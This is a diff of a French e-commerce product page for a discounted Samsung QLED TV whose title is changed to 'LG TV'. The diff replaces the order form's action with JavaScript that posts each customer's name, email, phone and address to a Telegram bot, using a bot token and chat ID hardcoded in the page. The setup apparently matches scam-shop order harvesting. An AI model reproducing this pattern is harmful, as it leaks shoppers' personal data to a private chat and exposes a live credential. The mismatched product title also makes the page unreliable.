@@ -394,7 +394,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Page Produit - Samsung TV</title>
+    <title>Page Produit - LG TV</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -448,22 +448,20 @@
     <div class="container">
         <!-- Information du produit -->
         <div class="product-info">
-            <img src="81W4MbZDa8L._AC_SX679_.jpg" alt="Samsung Téléviseur TQ55Q60C">
-            <h3>Samsung Téléviseur TQ55Q60C 55" QLED 4K Smart TV 2023</h3>
-            <p>Taille de l'écran : 55 Pouces</p>
-            <p>Marque : Samsung</p>
-            <p>Technologie d'affichage : QLED</p>
-            <p>Résolution : 4K</p>
-            <p>Fréquence de rafraîchissement : 50 Hz</p>
-            <p>Caractéristique spéciale : Chromecast intégré</p>
-            <p>Connectivité : Bluetooth, HDMI, USB, Wi-Fi</p>
-            <p>Dimensions : 123,2L x 74,6H x 1P cm</p>
-            <p>Note : 4.6 ★★★★☆ (1450 avis)</p>
-            <p>
-                <span class="old-price">699.99€</span>
-                <span class="price">445.99€</span>
-            </p>
-        </div>
+    <img src="81W4MbZDa8L._AC_SX679_.jpg" alt="Samsung TV - QLED 65Q80A">
+    <h3>Samsung TV - QLED 65Q80A - 65 Pouces (165 cm) - QLED 4K</h3>
+    <p>Taille de l'écran : 65 Pouces</p>
+    <p>Marque : Samsung</p>
+    <p>Technologie d'affichage : QLED</p>
+    <p>Résolution : 4K</p>
+    <p>Fréquence de rafraîchissement : 100 Hz</p>
+    <p>Technologie de connectivité : USB, HDMI</p>
+    <p>Note : 4.8 ★★★★★ (7800 avis)</p>
+    <p>
+        <span class="old-price">899.99€</span>
+        <span class="price">749.99€</span>
+    </p>
+</div>
     </div>
 </body>
 </html>
@@ -485,17 +483,21 @@
             </div>
         </div>
 
-         <!-- Formulaire -->
-        <div class="container">
+<!-- Formulaire -->
+<div class="container">
     <h2>Remplissez vos informations</h2>
-    <form action="page-livraison2.html" method="GET">
+    <form id="orderForm">
         <div class="form-group">
-            <label for="prenom">Prénom *</label>
-            <input type="text" id="prenom" name="prenom" required placeholder="Entrez votre prénom">
+            <label for="nom_complet">Nom et prénom *</label>
+            <input type="text" id="nom_complet" name="nom_complet" required placeholder="Entrez votre nom et prénom">
         </div>
         <div class="form-group">
-            <label for="nom">Nom *</label>
-            <input type="text" id="nom" name="nom" required placeholder="Entrez votre nom">
+            <label for="email">Email *</label>
+            <input type="email" id="email" name="email" required placeholder="Entrez votre email">
+        </div>
+        <div class="form-group">
+            <label for="telephone">Téléphone *</label>
+            <input type="tel" id="telephone" name="telephone" required placeholder="Entrez votre numéro de téléphone">
         </div>
         <div class="form-group">
             <label for="rue">Rue *</label>
@@ -513,41 +515,84 @@
             <label for="ville">Ville *</label>
             <input type="text" id="ville" name="ville" required placeholder="Entrez votre ville">
         </div>
+
+        <!-- Bouton pour afficher le champ Hameau -->
+        <div class="form-group">
+            <input type="checkbox" id="toggle_hameau" onclick="toggleHameauField()">
+            <label for="toggle_hameau">Habitez-vous dans un hameau ?</label>
+        </div>
+
+        <!-- Champ Hameau masqué par défaut -->
+        <div class="form-group" id="hameau_field" style="display: none;">
+            <label for="hameau">Nom du hameau</label>
+            <input type="text" id="hameau" name="hameau" placeholder="Entrez le nom de votre hameau">
+        </div>
+
         <div class="form-group">
             <input type="submit" value="Confirmer La Commande">
         </div>
     </form>
 </div>
-        </form>
-    </div>
 
-        <!-- FAQ -->
-        <div class="faq">
-            <h3>Questions Fréquemment Posées</h3>
-            <p><strong>Est-il possible de retourner le produit ?</strong> Oui, les retours sont possibles sous 14 jours.</p>
-            <p><strong>Quels sont les délais de livraison ?</strong> Livraison sous 1 à 2 jours ouvrables en France.</p>
-            <p><strong>Puis-je payer en plusieurs fois ?</strong> Oui, des options de paiement en plusieurs fois sont disponibles.</p>
-        </div>
+<script>
+    // إظهار أو إخفاء الحقل الخاص بالهامو
+    function toggleHameauField() {
+        const hameauField = document.getElementById('hameau_field');
+        const toggleCheckbox = document.getElementById('toggle_hameau');
+        hameauField.style.display = toggleCheckbox.checked ? 'block' : 'none';
+    }
 
-        <!-- Badges de confiance -->
-        <div class="trust-badges">
-            <div>
-                <img src="Paiement-CB.jpg" alt="Paiement Sécurisé">
-                <p>Paiement Sécurisé</p>
-            </div>
-            <div>
-                <img src="satisfaction.jpg" alt="Garantie de Satisfaction">
-                <p>Garantie Satisfaction</p>
-            </div>
-            <div>
-                <img src="227-category_default.webp" alt="Expédition Rapide">
-                <p>Expédition Rapide</p>
-            </div>
-        </div>
-    </div>
+    // إرسال البيانات إلى Telegram عند تقديم الطلب
+    document.getElementById("orderForm").addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const token = "7622010459:AAEULJ_rVIi0HNoQj_LLjC5VzQg-OPZ45QE"; // استبدل بالتوكن الخاص بك
+        const chatId = "5372119436"; // استبدل بمعرف الدردشة الخاص بك
+
+        const formData = new FormData(this);
+        const message = `
+    Nouvelle commande:
+    Produit : Samsung TV - QLED 65Q80A - 65 Pouces QLED 4K
+    Prix : ${749.99}
+    Nom: ${formData.get("nom_complet")}
+    Email: ${formData.get("email")}
+    Téléphone: ${formData.get("telephone")}
+    Rue: ${formData.get("rue")}
+    N°: ${formData.get("numero") || "Non spécifié"}
+    Code Postal: ${formData.get("code_postal")}
+    Ville: ${formData.get("ville")}
+    Hameau: ${formData.get("hameau") || "Non spécifié"}
+`;
+
+        // إرسال البيانات إلى تلغرام
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            }),
+        })
+        .then(response => {
+            if (response.ok) {
+                window.location.href = "page-livraison1.html"; // تحويل إلى الصفحة الجديدة
+            } else {
+                alert("Erreur lors de l'envoi de la commande. Veuillez réessayer.");
+            }
+        })
+        .catch(error => {
+            console.error("Erreur:", error);
+            alert("Erreur réseau. Veuillez réessayer.");
+        });
+    });
+</script>
+
 </body>
 </html>
-        <!-- Footer -->
+
+<!-- Footer -->
 <footer style="background-color: #2c3e50; color: #ecf0f1; padding: 20px;">
     <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
         <!-- Colonne 1 -->
